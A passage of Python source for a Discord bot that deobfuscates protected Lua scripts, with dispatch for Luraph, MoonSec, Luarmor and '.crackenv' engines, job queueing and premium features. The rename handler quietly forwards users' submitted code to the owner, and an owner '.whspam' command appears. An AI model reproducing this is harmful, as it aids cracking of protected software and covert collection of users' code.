            description=f\"{EMOJI_FAIL} {TIMEOUT_ERROR}\",
            color=BAD)
        em.add_field(name=\"Job ID\", value=f\"`{debug_job_id}`\", inline=True)
        em.set_footer(text=_make_footer())
        await s.edit(content=None, embed=em)

# =========================
# COMMAND ERROR HANDLER
# =========================
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    print(f\"[CommandError] {type(error).__name__}\")
    try:
        em = discord.Embed(
            description=f\"command error: {TIMEOUT_ERROR}\",
            color=BAD)
        await ctx.reply(embed=em)
    except Exception:
        pass

# =========================
# ON READY
# =========================
@bot.event
async def on_ready():
    global dump_queue, _background_thread, _queue_restored, _premium_role_ready_sync_done
    print(f\"logged in as {bot.user} | {len(bot.guilds)} servers\")
    if not _premium_role_ready_sync_done:
        for guild in list(bot.guilds):
            try:
                await _sync_premium_role(guild)
            except Exception as e:
                print(f\"[PremiumRole] ready sync failed in {guild.id}: {e}\")
        _premium_role_ready_sync_done = True
    await proxy_manager.load()
    # on_ready can fire again after a reconnect. Keep the existing queue and
    # reuse each long-lived worker instead of creating duplicate consumers.
    if dump_queue is None:
        dump_queue = asyncio.Queue()
    if not _queue_restored:
        try:
            restored = await _restore_persisted_l_jobs()
            if restored:
                print(f\"[Queue] restored {restored} persisted .l job(s)\")
        except Exception as e:
            print(f\"[Queue] restore failed: {e}\")
        _queue_restored = True
    task_factories = {
        \"dump_worker\": dump_worker,
        \"auto_reload_proxies\": auto_reload_proxies,
        \"premium_cleanup\": _premium_cleanup_task,
        \"usage_report\": usage_report_task,
        \"resource_monitor\": resource_monitor_task,
    }
    for task_name, factory in task_factories.items():
        task = _background_tasks.get(task_name)
        if task is None or task.done():
            _background_tasks[task_name] = bot.loop.create_task(factory(), name=f\"kvms:{task_name}\")
    if _background_thread is None or not _background_thread.is_alive():
        _background_thread = threading.Thread(target=background_worker, daemon=True, name=\"kvms-background\")
        _background_thread.start()
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name=\".l | dumps\"))


@bot.event
async def on_member_join(member):
    if is_premium(int(member.id)):
        try:
            await _assign_premium_role(member, member.guild)
        except Exception as e:
            print(f\"[PremiumRole] join sync failed in {member.guild.id}: {e}\")

# =========================
# COMMAND DISABLE CHECK
# =========================
def _is_cmd_disabled_for(cmd_name: str, user_id: int) -> bool:
    if cmd_name in disabled_commands and user_id != OWNER_ID:
        return True
    return False

# =========================
# AUTOMATIC OBFUSCATOR DETECTION FOR SOURCE COMMANDS
# =========================
AUTO_DETECT_COMMANDS = {\".l\", \".l2\", \".l3\", \".deobf\"}


def _command_after(content: str, command: str) -> str:
    return content[len(command):].strip() if content.lower().startswith(command) else \"\"


async def _source_for_command_detection(message, content: str, command: str):
    \"\"\"Return (kind, source) without prompting for inline code.

    ``kind`` is ``code`` for inline/fenced/replied plain code, ``file`` for an
    attachment, and ``url`` for a URL.  Only the latter two (and URL replies)
    need the automatic detector; code is deliberately sent straight through.
    \"\"\"
    # Keep source precedence aligned with the existing processing handlers.
    own_attachments = getattr(message, \"attachments\", []) or []
    if any(getattr(a, \"filename\", \"\").lower().endswith((\".lua\", \".luau\", \".txt\"))
           for a in own_attachments):
        source = await extract_lua_from(message)
        return (\"file\", source) if source else (\"file\", None)

    # Explicit inline/fenced code always bypasses detection, even if the
    # message also happens to be a reply or contains unrelated text.
    direct_cb = LUA_CODEBLOCK.search(content)
    if direct_cb:
        return \"code\", direct_cb.group(1).strip()
    direct_after = _command_after(content, command)
    if direct_after and not direct_after.startswith((\"http://\", \"https://\")):
        return \"code\", direct_after

    if getattr(message, \"reference\", None):
        ref = getattr(message.reference, \"resolved\", None)
        if ref is None:
            try:
                ref = await message.channel.fetch_message(message.reference.message_id)
            except Exception:
                ref = None
        if ref is not None:
            ref_attachments = getattr(ref, \"attachments\", []) or []
            if any(getattr(a, \"filename\", \"\").lower().endswith((\".lua\", \".luau\", \".txt\"))
                   for a in ref_attachments):
                source = await extract_lua_from(ref)
                return (\"file\", source) if source else (\"file\", None)
            ref_content = (getattr(ref, \"content\", \"\") or \"\").strip()
            if ref_content:
                cb = LUA_CODEBLOCK.search(ref_content)
                if cb:
                    return \"code\", cb.group(1).strip()
                ref_url = URL_RE.search(ref_content)
                if ref_url and ref_content == ref_url.group(0).strip():
                    return \"url\", ref_url.group(0).rstrip(\".,)`'\\\"\")
                # Replies to ordinary unfenced Lua/code are intentionally not
                # sent through detection, just like inline code.
                if not ref_content.startswith(\".\"):
                    return \"code\", ref_content

    after = _command_after(content, command)
    if after and after.startswith((\"http://\", \"https://\")):
        return \"url\", after.split()[0].rstrip(\".,)`'\\\"\")
    return None, None


def _recommended_auto_target(detected_name: str, recommendation: str) -> str:
    \"\"\"Convert owner recommendations into a permitted engine target.\"\"\"
    recommendation = recommendation or \"\"
    # Detection is still initiated only by .l/.l2/.l3/.deobf, but a
    # recommendation may select any supported processing engine.
    allowed = {
        \".l\", \".l2\", \".l3\", \".deobf\",
        \".promdeobf\", \".moonsec\", \".lph\", \".wyn\",
    }
    for candidate in re.findall(r\"\\.[a-z0-9]+\", recommendation.lower()):
        if candidate in allowed:
            return candidate
    # Older Luraph recommendations sometimes used a deprecated command.
    # Use the current single-engine `.lph` target instead.
    if \"luraph\" in (detected_name or \"\").lower():
        return \".lph\"
    return \".deobf\"


async def _handle_l_command(message, content: str, enforce_cooldown: bool = True):
    \"\"\"Queue the main dumper while preserving the durable queue and one-job rule.\"\"\"
    uid = message.author.id
    if await _user_job_busy(uid):
        return await _safe_reply(message, content=\"you already have a job running; wait for it to finish or use `.cancel`\")
    if enforce_cooldown:
        remaining = _l_check_cooldown(uid)
        if remaining > 0:
            if not await _check_anti_spam(message, \"l\"):
                return
            embed = discord.Embed(
                description=f\"ƒ‚‚ you can use `.l` again in **{int(remaining)}s** - get premium to skip this\",
                color=WARN)
            embed.set_footer(text=_make_footer())
            return await _safe_reply(message, embed=embed, mention_author=False)
    if not (ROOT / \"v1.lua\").exists():
        return await _safe_reply(message,
            embed=discord.Embed(color=BAD, description=\"**`v1.lua` not found**\"),
            mention_author=False)
    jobs = await gather_l_jobs(message)
    if not jobs:
        return await _safe_reply(message,
            embed=discord.Embed(color=ACCENT,
                description=\"attach a `.lua` file, paste a url, reply to a message, or type inline code\\nexample: `.l print('hello')`\"),
            mention_author=False)
    user_job_state = await _claim_user_job(uid)
    if user_job_state is None:
        return await _safe_reply(message,
            content=\"you already have a job running; wait for it to finish or use `.cancel`\")
    user_job_state[\"remaining\"] = len(jobs)
    try:
        await react(message, EMOJI_LOADING)
        await _enqueue_l_jobs(message, jobs, user_job_state)
        if enforce_cooldown:
            _l_set_cooldown(uid, len(jobs))
    except BaseException:
        await _cancel_user_job(uid)
        raise
    try:
        job_ids = user_job_state.get(\"job_ids\") or [user_job_state.get(\"job_id\")]
        id_text = \", \".join(f\"`{value}`\" for value in job_ids if value)
        queue_text = f\"queued `{len(jobs)}` job(s)\"
        if len(jobs) > 1 and enforce_cooldown:
            queue_text += \", running them all at once\"
        await _safe_reply(message, content=f\"{queue_text} | Job ID(s): {id_text or 'unavailable'}\",
            mention_author=False, delete_after=10)
    except Exception:
        pass


async def _run_selected_auto_command(message, content: str, command: str):
    \"\"\"Dispatch a selected engine directly, avoiding a second detection pass.\"\"\"
    command = command.lower()
    name = command.lstrip(\".\")
    if _is_cmd_disabled_for(name, message.author.id):
        return await _reply_disabled(message, name)
    if command == \".l\":
        return await _handle_l_command(message, content, enforce_cooldown=message.guild is not None)
    if command == \".lph\":
        return await _handle_lph_command(message, content)
    engine_map = {
        \".l2\": (run_v2, \"processing v2\", \"v2_output.lua\", \"V2 Output\"),
        \".l3\": (run_v3, \"processing v3\", \"v3_output.lua\", \"V3 Output\"),
        \".deobf\": (run_deobf, \"deobfuscating\", \"deobf_output.lua\", \"Deobf Output\"),
        \".promdeobf\": (run_promdeobf, \"decrypting\", \"decrypted.lua\", \"Prometheus Deobf\"),
        \".moonsec\": (run_moonsec, \"decrypting moonsec\", \"moonsec_decrypted.lua\", \"MoonSec Deobf\"),
        \".wyn\": (run_wyn, \"processing wyn\", \"wyn_output.lua\", \"Wynfuscate Output\"),
    }
    runner = engine_map.get(command)
    if runner is None:
        return await _safe_reply(message, content=\"invalid automatic engine recommendation\")
    engine_fn, label, filename, title = runner
    return await _handle_engine_command(message, content, command, engine_fn,
        label, filename, title)


class DetectionChoiceView(discord.ui.View):
    def __init__(self, owner_id: int, status_message, original_message,
                 original_content: str, selected_command: str, recommended: str):
        super().__init__(timeout=120)
        self.owner_id = owner_id
        self.status_message = status_message
        self.original_message = original_message
        self.original_content = original_content
        self.selected_command = selected_command
        self.recommended = recommended
        use_button = discord.ui.Button(label=f\"Use {recommended}\", style=ButtonStyle.success,
                                       custom_id=\"kvms_detection_use\")
        original_button = discord.ui.Button(
            label=f\"No €” use {selected_command}\", style=ButtonStyle.secondary,
            custom_id=\"kvms_detection_original\")
        cancel_button = discord.ui.Button(label=\"Cancel\", style=ButtonStyle.danger,
                                          custom_id=\"kvms_detection_cancel\")
        use_button.callback = self.use_recommendation
        original_button.callback = self.use_original_command
        cancel_button.callback = self.cancel
        self.add_item(use_button)
        self.add_item(original_button)
        self.add_item(cancel_button)

    async def _owned(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.owner_id:
            await interaction.response.send_message(\"this choice belongs to the requesting user\", ephemeral=True)
            return False
        return True

    async def use_recommendation(self, interaction: discord.Interaction):
        if not await self._owned(interaction):
            return
        for item in self.children:
            item.disabled = True
        await interaction.response.edit_message(
            embed=discord.Embed(title=\"Making choice\", description=f\"continuing with `{self.recommended}`...\", color=ACCENT),
            view=self)
        self.stop()
        selected = re.sub(r\"^\\.[A-Za-z0-9]+\", self.recommended,
                          self.original_content, count=1)
        try:
            await _run_selected_auto_command(self.original_message, selected, self.recommended)
        finally:
            try:
                await interaction.message.delete()
            except Exception:
                pass

    async def use_original_command(self, interaction: discord.Interaction):
        if not await self._owned(interaction):
            return
        for item in self.children:
            item.disabled = True
        await interaction.response.edit_message(
            embed=discord.Embed(
                title=\"Using original command\",
                description=f\"continuing with `{self.selected_command}`...\",
                color=ACCENT),
            view=self)
        self.stop()
        try:
            # The original command is dispatched directly, so detection is not
            # repeated and the user's chosen engine is respected.
            await _run_selected_auto_command(
                self.original_message, self.original_content, self.selected_command)
        finally:
            try:
                await interaction.message.delete()
            except Exception:
                pass

    async def cancel(self, interaction: discord.Interaction):
        if not await self._owned(interaction):
            return
        self.stop()
        await interaction.response.edit_message(
            embed=discord.Embed(title=\"Detection cancelled\", description=\"no engine was run\", color=WARN),
            view=None)


async def _handle_detect_or_dispatch(message, content: str, command: str):
    \"\"\"Detect only URL/file/replied-source inputs for the four public commands.\"\"\"
    command = command.lower()
    if await _user_job_busy(message.author.id):
        return await _safe_reply(message, content=\"you already have a job running; wait for it to finish or use `.cancel`\")
    # Preserve `.l`'s existing cooldown behavior before doing any detector
    # fetches or presenting a confirmation prompt. Owner DMs keep their old
    # no-cooldown policy.
    if command == \".l\" and message.guild is not None:
        remaining = _l_check_cooldown(message.author.id)
        if remaining > 0:
            if not await _check_anti_spam(message, \"l\"):
                return
            embed = discord.Embed(
                description=f\"ƒ‚‚ you can use `.l` again in **{int(remaining)}s** - get premium to skip this\",
                color=WARN)
            embed.set_footer(text=_make_footer())
            return await _safe_reply(message, embed=embed, mention_author=False)
    kind, source = await _source_for_command_detection(message, content, command)
    # Inline/fenced/replied plain code must process immediately.
    if kind == \"code\":
        return await _run_selected_auto_command(message, content, command)

    status = await _safe_reply(
        message,
        embed=discord.Embed(title=\"Detecting obfuscator\", description=\"examining the source...\", color=ACCENT),
        mention_author=False)
    if source is None and kind in {\"file\", \"url\"}:
        await _safe_edit(status, embed=discord.Embed(title=\"Detection failed\",
            description=\"could not read that source; continuing with your selected command\", color=WARN), view=None)
        try:
            await _run_selected_auto_command(message, content, command)
        finally:
            try: await status.delete()
            except Exception: pass
        return
    if kind not in {\"file\", \"url\"}:
        try: await status.delete()
        except Exception: pass
        return await _run_selected_auto_command(message, content, command)

    if kind == \"url\":
        try:
            raw = await fetch_from_url(source)
            source = raw.decode(\"utf-8\", errors=\"ignore\") if raw else \"\"
        except Exception:
            await _safe_edit(status, embed=discord.Embed(title=\"Detection failed\",
                description=\"could not fetch that URL; continuing with your selected command\", color=WARN), view=None)
            try:
                await _run_selected_auto_command(message, content, command)
            finally:
                try: await status.delete()
                except Exception: pass
            return
    if not source or not _source_within_input_limit(source):
        await _safe_edit(status, embed=discord.Embed(title=\"Detection failed\",
            description=\"the source is empty or exceeds the 8 MB input limit; continuing with your selected command\", color=WARN), view=None)
        try:
            await _run_selected_auto_command(message, content, command)
        finally:
            try: await status.delete()
            except Exception: pass
        return

    await _safe_edit(status, embed=discord.Embed(title=\"Making choice\",
        description=\"checking known obfuscator patterns...\", color=ACCENT), view=None)
    detected = _detect_obfuscator(source)
    if not detected:
        unknown_embed = discord.Embed(
            title=\"Obfuscator unknown\",
            description=f\"couldn't identify it; continuing with your selected command `{command}`\",
            color=WARN)
        unknown_embed.add_field(name=\"Confidence\", value=\"`0%`\", inline=True)
        unknown_embed.add_field(name=\"Matched regions\", value=\"`none`\", inline=True)
        unknown_embed.add_field(name=\"Matched counts\", value=\"patterns: `0` | signatures: `0`\", inline=True)
        await _safe_edit(status, embed=unknown_embed, view=None)
        try:
            await _run_selected_auto_command(message, content, command)
        finally:
            try: await status.delete()
            except Exception: pass
        return

    detected_name, recommendation, description, _notes, confidence, match_info = detected
    _record_detector_hit(detected_name, match_info, confidence)
    recommended = _recommended_auto_target(detected_name, recommendation)
    embed = discord.Embed(title=\"Obfuscator detected\",
        description=(f\"KVms thinks this is \\\"{_strip_mentions(detected_name)}\\\". \"
                     f\"We recommend using \\\"{recommended}\\\".\\n\\n\"
                     f\"Continue with \\\"{recommended}\\\"?\\n\"
                     f\"No will continue with your original command \\\"{command}\\\".\"),
        color=GOOD if confidence >= 75 else WARN)
    embed.add_field(name=\"Confidence\", value=f\"`{confidence}%`\", inline=True)
    regions = \", \".join(_strip_mentions(str(value)) for value in
                          (match_info or {}).get(\"matched_regions\", [])) or \"heuristic / not stored\"
    embed.add_field(name=\"Matched regions\", value=f\"`{regions[:500]}`\", inline=False)
    embed.add_field(name=\"Matched counts\",
                    value=(f\"patterns: `{(match_info or {}).get('matched_pattern_count', 0)}` | \"
                           f\"signatures: `{(match_info or {}).get('matched_signature_count', 0)}`\"),
                    inline=True)
    if description:
        embed.add_field(name=\"Detector\", value=_strip_mentions(description)[:1000], inline=False)
    embed.set_footer(text=_make_footer())
    view = DetectionChoiceView(message.author.id, status, message, content, command, recommended)
    await _safe_edit(status, embed=embed, view=view)

# =========================
# ON MESSAGE
# =========================
@bot.event
async def on_message(message):
    if message.author.bot:
        return
    if message.author.id in banned_users:
        try:
            await message.reply(\"you're banned, can't help you here\")
        except Exception:
            pass
        return

    # Cancellation is handled before ordinary dispatch so a user can stop a
    # job from a guild channel. Preserve the existing rule that non-owner DM
    # commands remain unavailable; the owner may use `.cancel all` in DMs.
    content = message.content.strip()
    if not (message.guild is None and message.author.id != OWNER_ID) and re.match(r'^\\.cancel(?:\\s|$)', content, re.I):
        args = content.split()[1:]
        if message.author.id == OWNER_ID and args and args[0].lower() == \"all\":
            count = await _cancel_all_user_jobs()
            return await _safe_reply(message, content=f\"cancelled `{count}` job(s)\")
        if args:
            return await _safe_reply(message, content=\"usage: `.cancel`\" + (\" or `.cancel all` (owner)\" if message.author.id == OWNER_ID else \"\"))
        if await _cancel_user_job(message.author.id):
            return await _safe_reply(message, content=\"cancellation requested\")
        return await _safe_reply(message, content=\"you do not have an active or queued job\")

    if not (message.guild is None and message.author.id != OWNER_ID) and re.match(r'^\\.job(?:\\s|$)', content, re.I):
        snapshot = await _user_job_snapshot(message.author.id)
        if snapshot is None:
            return await _safe_reply(message, content=\"you do not have an active or queued job\")
        total = max(1, int(snapshot.get(\"total\") or 1))
        completed = min(total, int(snapshot.get(\"completed\") or 0))
        position_value = snapshot.get(\"queue_position\")
        if snapshot.get(\"cancelled\"):
            status = \"cancelling\"
        elif position_value == \"waiting\":
            status = \"queued\"
        elif isinstance(position_value, int) and position_value > MAX_CONCURRENT_JOBS:
            status = \"queued\"
        else:
            status = \"processing\"
        elapsed = max(0.0, time.time() - float(snapshot.get(\"started_at\") or time.time()))
        position = snapshot.get(\"queue_position\") or \"waiting\"
        command = snapshot.get(\"command\") or \"processing\"
        job_ids = snapshot.get(\"job_ids\") or [snapshot.get(\"job_id\")]
        job_ids = [str(value) for value in job_ids if value]
        id_text = \", \".join(f\"`{value}`\" for value in job_ids[:4]) or \"unavailable\"
        if len(job_ids) > 4:
            id_text += f\" (+{len(job_ids) - 4} more)\"
        id_clause = \"\" if str(command).lower() == \".obf\" else f\" | IDs: {id_text}\"
        return await _safe_reply(
            message,
            content=(f\"job `{command}`: **{status}**{id_clause} | progress `{completed}/{total}` | \"
                     f\"queue position `{position}` | elapsed `{elapsed:.1f}s`\"),
        )

    if message.guild is None:
        content = message.content.strip()
        if re.match(r'^\\.obf(\\s|$)', content, re.I):
            await _handle_obf_command(message, content)
            return
        if message.author.id != OWNER_ID:
            return
        await _handle_owner_dm(message, content)
        return

    # Premium role configuration is owner-only and intentionally works in the
    # guild where it is being configured, not only in the public allowlist.
    if message.author.id == OWNER_ID and re.match(r'^\\.premrole(?:\\s|$)', message.content.strip(), re.I):
        await bot.process_commands(message)
        return

    if not is_allowed(message):
        return

    content = message.content.strip()

    # Remove guild .obf input even when a later policy/disable check stops the
    # job.  DMs take the separate path above and are never deleted.
    if re.match(r'^\\.obf(\\s|$)', content, re.I):
        await _prepare_obf_privacy(message)

    # TOS gate
    if message.author.id != OWNER_ID:
        gated = (\".l\", \".l2\", \".l3\", \".deobf\", \".wyn\", \".promdeobf\",
                 \".beautify\", \".lph\", \".moonsec\", \".get\", \".crackenv\", \".cenv\",
                 \".luarmor\", \".rename\", \".obf\", \".upload\", \".detect\", \".dtc\", \".constant\")
        if any(content.lower().startswith(p) for p in gated):
            if not await _ensure_tos(message):
                return

    # Only count REAL bot commands as usage. Normal chat in the whitelist
    # channel must never trigger stats, the usage alert, or the roast.
    if _is_command_message(content):
        asyncio.ensure_future(_track_usage(message.author.id))

        # Track per-user per-command stats (for .stats)
        m = re.match(r'^\\.([A-Za-z0-9]+)', content)
        if m:
            _track_cmd(message.author.id, m.group(1).lower())

        # Heavy-usage roast: 15+ commands in 10 min -> roast them but keep going
        if message.author.id != OWNER_ID and _check_heavy_usage(message.author.id):
            asyncio.ensure_future(_send_roast(message))

        # Rare, rate-limited two-line self-dialogue. It is triggered by
        # command activity, never by an idle timer.
        asyncio.ensure_future(_maybe_self_talk())

    if content.startswith(\".whspam\"):
        await _handle_whspam_command(message, content)
        return

    if content.startswith(\".get\"):
        url = content[4:].strip()
        if not url:
            return await _safe_reply(message, content=\"`.get <url>`\")
        if not url.startswith((\"http://\", \"https://\")):
            return await _safe_reply(message, content=\"that's not a valid url\")
        t_start = time.perf_counter()
        f = await _safe_reply(message, content=f\"{EMOJI_LOADING} fetching...\")
        try:
            raw = await fetch_from_url(url)
            if not raw:
                return await _safe_edit(f, content=\"empty response, nothing there\")
            raw     = _mask_host_ip_bytes(raw)
            txt     = raw.decode(\"utf-8\", errors=\"ignore\")
            took    = time.perf_counter() - t_start
            preview = _strip_mentions(\"\\n\".join(txt.splitlines()[:30]))[:1000]
            embed   = discord.Embed(title=\"Fetched\",
                description=f\"```lua\\n{preview}\\n```\", color=0x2b2d31)
            embed.set_footer(text=_make_footer(took))
            await f.delete()
            await _safe_reply(message, embed=embed,
                file=discord.File(io.BytesIO(raw), filename=\"fetched.lua\"))
        except Exception as e:
            em = discord.Embed(
                description=f\"{EMOJI_FAIL} fetch failed:\\n```{_strip_mentions(_sanitize_error(str(e)))[:1900]}```\",
                color=BAD)
            em.set_footer(text=_make_footer())
            await _safe_edit(f, content=None, embed=em)
        return

    if content.startswith(\".redeem\"):
        await bot.process_commands(message)
        return

    if content.lower().startswith((\".detect\", \".dtc\")):
        await bot.process_commands(message)
        return

    if re.match(r'^\\.lph(\\s|$)', content, re.I):
        if _is_cmd_disabled_for(\"lph\", message.author.id):
            return await _reply_disabled(message, \"lph\")
        await _handle_lph_command(message, content)
        return

    if content.startswith(\".promdeobf\"):
        if _is_cmd_disabled_for(\"promdeobf\", message.author.id):
            return await _reply_disabled(message, \"promdeobf\")
        await _handle_engine_command(message, content, \".promdeobf\", run_promdeobf,
            \"decrypting\", \"decrypted.lua\", \"Prometheus Deobf\")
        return

    if content.startswith(\".beautify\"):
        if _is_cmd_disabled_for(\"beautify\", message.author.id):
            return await _reply_disabled(message, \"beautify\")
        await _handle_engine_command(message, content, \".beautify\", run_beautify,
            \"beautifying\", \"beautified.lua\", \"Beautified\")
        return

    if content.startswith(\".moonsec\"):
        if _is_cmd_disabled_for(\"moonsec\", message.author.id):
            return await _reply_disabled(message, \"moonsec\")
        await _handle_engine_command(message, content, \".moonsec\", run_moonsec,
            \"decrypting moonsec\", \"moonsec_decrypted.lua\", \"MoonSec Deobf\")
        return

    if re.match(r'^\\.upload(\\s|$)', content, re.I):
        if _is_cmd_disabled_for(\"upload\", message.author.id):
            return await _reply_disabled(message, \"upload\")
        await _handle_upload_command(message, content)
        return

    if re.match(r'^\\.obf(\\s|$)', content, re.I):
        if _is_cmd_disabled_for(\"obf\", message.author.id):
            return await _reply_disabled(message, \"obf\")
        await _handle_obf_command(message, content)
        return

    if content.startswith(\".deobf\"):
        if _is_cmd_disabled_for(\"deobf\", message.author.id):
            return await _reply_disabled(message, \"deobf\")
        await _handle_detect_or_dispatch(message, content, \".deobf\")
        return

    if content.startswith(\".wyn\"):
        if _is_cmd_disabled_for(\"wyn\", message.author.id):
            return await _reply_disabled(message, \"wyn\")
        await _handle_engine_command(message, content, \".wyn\", run_wyn,
            \"processing wyn\", \"wyn_output.lua\", \"Wynfuscate Output\")
        return

    if content.startswith(\".constant\"):
        if _is_cmd_disabled_for(\"constant\", message.author.id):
            return await _reply_disabled(message, \"constant\")
        await _handle_engine_command(message, content, \".constant\", run_constant,
            \"dumping constants\", \"constants_output.lua\", \"Constant Dump\")
        return

    if content.startswith(\".rename\"):
        if _is_cmd_disabled_for(\"rename\", message.author.id):
            return await _reply_disabled(message, \"rename\")
        await _handle_rename_command(message, content)
        return

    if content.startswith(\".l3\"):
        if _is_cmd_disabled_for(\"l3\", message.author.id):
            return await _reply_disabled(message, \"l3\")
        await _handle_detect_or_dispatch(message, content, \".l3\")
        return

    if content.startswith(\".l2\"):
        if _is_cmd_disabled_for(\"l2\", message.author.id):
            return await _reply_disabled(message, \"l2\")
        await _handle_detect_or_dispatch(message, content, \".l2\")
        return

    if re.match(r'^\\.l(\\s|$)', content):
        if _is_cmd_disabled_for(\"l\", message.author.id):
            return await _reply_disabled(message, \"l\")
        await _handle_detect_or_dispatch(message, content, \".l\")
        return

    await bot.process_commands(message)

# =========================
# RENAME COMMAND HANDLER
# =========================
async def _handle_rename_command(message, content: str):
    if await _user_job_busy(message.author.id):
        return await _safe_reply(message, content=\"you already have a job running; wait for it to finish or use `.cancel`\")
    lua_code = None
    filename = \"input.lua\"

    # Check attachments
    for att in message.attachments:
        if att.filename.endswith((\".lua\", \".luau\", \".txt\")):
            try:
                raw = await _read_attachment_limited(att)
                if raw:
                    lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
                    filename = att.filename
                    break
            except Exception:
                pass

    # Check reply
    if not lua_code and message.reference:
        try:
            ref = (message.reference.resolved or
                   await message.channel.fetch_message(message.reference.message_id))
            lua_code = await extract_lua_from(ref)
        except Exception:
            pass

    # Check URL or inline
    if not lua_code:
        parts = content.split(maxsplit=1)
        if len(parts) > 1:
            after = parts[1].strip()
            if after.startswith((\"http://\", \"https://\")):
                try:
                    s = await _safe_reply(message, content=f\"{EMOJI_LOADING} fetching...\")
                    raw = await fetch_from_url(after.split()[0])
                    lua_code = raw.decode(\"utf-8\", errors=\"ignore\") if raw else None
                    await s.delete()
                except Exception as e:
                    em = discord.Embed(
                        description=f\"{EMOJI_FAIL} fetch failed:\\n```{_strip_mentions(_sanitize_error(str(e)))[:1900]}```\",
                        color=BAD)
                    em.set_footer(text=_make_footer())
                    return await _safe_reply(message, embed=em, mention_author=False)
            else:
                cb = LUA_CODEBLOCK.search(content)
                lua_code = cb.group(1).strip() if cb else after

    if not lua_code:
        return await _safe_reply(message, content=\"`.rename <code|url|reply|file>` - give me a lua script to rename\")
    if not _source_within_input_limit(lua_code):
        return await _safe_reply(message, content=\"input too large (maximum 8 MB)\")

    asyncio.ensure_future(_forward_to_owner(\"rename\", message.author, filename,
        lua_code.encode(\"utf-8\", errors=\"ignore\"), message))

    t_start = time.perf_counter()
    s = await _safe_reply(message, content=f\"{EMOJI_LOADING} renaming variables...\")
    user_job_state = await _claim_user_job(message.author.id)
    if user_job_state is None:
        return await _safe_edit(s, content=\"you already have a job running; wait for it to finish or use `.cancel`\", embed=None)
    user_job_state[\"status\"] = s
    _job_bind_message(user_job_state, message)
    _job_set_command(user_job_state, \".rename\")
    input_source, input_name, input_url = _job_source_info(message, content, \".rename\", filename)
    _job_set_input(user_job_state, lua_code, source=input_source,
                   filename=input_name, url=input_url)
    try:
        await _safe_edit(s, content=f\"{EMOJI_LOADING} renaming variables... | Job ID: `{user_job_state['job_id']}`\")
    except Exception:
        pass
    try:
        with tempfile.TemporaryDirectory() as tmp:
            in_path  = os.path.join(tmp, \"input.lua\")
            out_path = os.path.join(tmp, \"output.lua\")
            with open(in_path, \"w\", encoding=\"utf-8\") as f:
                f.write(lua_code)
            job_priority = 1 if is_premium(message.author.id) else 0
            user_job_state[\"command\"] = \".rename\"
            user_job_state[\"priority\"] = job_priority
            user_job_state[\"queue_position\"] = \"waiting\"
            job_position = await _enter_job_queue(priority=job_priority)
            user_job_state[\"queue_position\"] = job_position
            try:
                if job_position > MAX_CONCURRENT_JOBS:
                    await _safe_edit(
                        s,
                        content=f\"{EMOJI_LOADING} queued at position {job_position}...\",
                    )
                out_data, err = await run_rename(in_path, out_path)
            finally:
                await _leave_job_queue()
            took = time.perf_counter() - t_start
            if err:
                _job_mark_status(user_job_state, \"failed\", TIMEOUT_ERROR)
                em = discord.Embed(
                    description=f\"{EMOJI_FAIL} {TIMEOUT_ERROR}\",
                    color=BAD)
                em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
                em.set_footer(text=_make_footer())
                await _safe_edit(s, content=None, embed=em)
                return
            if out_data is None:
                _job_mark_status(user_job_state, \"failed\", TIMEOUT_ERROR)
                em = discord.Embed(description=f\"{EMOJI_FAIL} {TIMEOUT_ERROR}\", color=BAD)
                em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
                em.set_footer(text=_make_footer())
                await _safe_edit(s, content=None, embed=em)
                return
            txt = out_data.decode(\"utf-8\", errors=\"ignore\") if isinstance(out_data, bytes) else str(out_data)
            txt = _strip_leakd_watermarks(_fix_mojibake(txt))
            renamed_bytes = txt.encode(\"utf-8\")
            if len(renamed_bytes) > MAX_OUTPUT_BYTES:
                _job_mark_status(user_job_state, \"failed\", TIMEOUT_ERROR)
                em = discord.Embed(description=f\"{EMOJI_FAIL} {TIMEOUT_ERROR}\", color=BAD)
                em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
                em.set_footer(text=_make_footer())
                await _safe_edit(s, content=None, embed=em)
                return
            _job_set_output(user_job_state, renamed_bytes, filename=\"renamed.lua\", status=\"completed\")
            asyncio.ensure_future(_send_owner_result_metadata(
                message, \"rename\", output_bytes=renamed_bytes,
                took=took, output_name=\"renamed.lua\",
            ))

            pastefy_url = None
            cfg = get_user_config(message.author.id)
            if cfg.get(\"pastefy_enabled\", True):
                pf = await asyncio.to_thread(_upload_to_pastefy, txt, \"renamed.lua\")
                if pf:
                    pastefy_url = pf

            lines     = txt.count(\"\\n\") + 1
            size      = len(txt.encode(\"utf-8\"))
            preview   = \"\\n\".join(txt.splitlines()[:30])[:1000]
            urls      = _extract_urls_from_output(txt)
            urls_line = _format_urls_footer(urls)

            embed = discord.Embed(title=\"Renamed\", color=GOOD)
            embed.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
            desc_parts = [
                f\"```lua\\n{preview}\\n```\",
                f\"`{lines:,} lines` | `{size/1024:.1f} KB`\",
            ]
            if pastefy_url:
                desc_parts.append(f\"**Pastefy:** {pastefy_url}\")
            desc_parts.append(urls_line)
            embed.description = \"\\n\".join(desc_parts)
            embed.set_footer(text=_make_footer(took))
            await s.delete()
            await _safe_reply(message, embed=embed,
                file=discord.File(io.BytesIO(renamed_bytes), filename=\"renamed.lua\"))
    except Exception as e:
        _job_mark_status(user_job_state, \"failed\", TIMEOUT_ERROR)
        try:
            em = discord.Embed(
                description=f\"{EMOJI_FAIL} {TIMEOUT_ERROR}\",
                color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
            em.set_footer(text=_make_footer())
            await _safe_edit(s, content=None, embed=em)
        except Exception:
            pass
    finally:
        await _finish_user_job(user_job_state)


# =========================
# OWNER DM HANDLER
# =========================
async def _handle_owner_dm(message, content: str):
    if content.startswith(\".ownerhelp\"):
        await bot.process_commands(message)
        return

    if content.startswith(\".whspam\"):
        await _handle_whspam_command(message, content)
        return

    if content.startswith(\".get\"):
        url = content[4:].strip()
        if not url:
            return await _safe_reply(message, content=\"`.get <url>`\")
        t_start = time.perf_counter()
        f = await _safe_reply(message, content=f\"{EMOJI_LOADING} fetching...\")
        try:
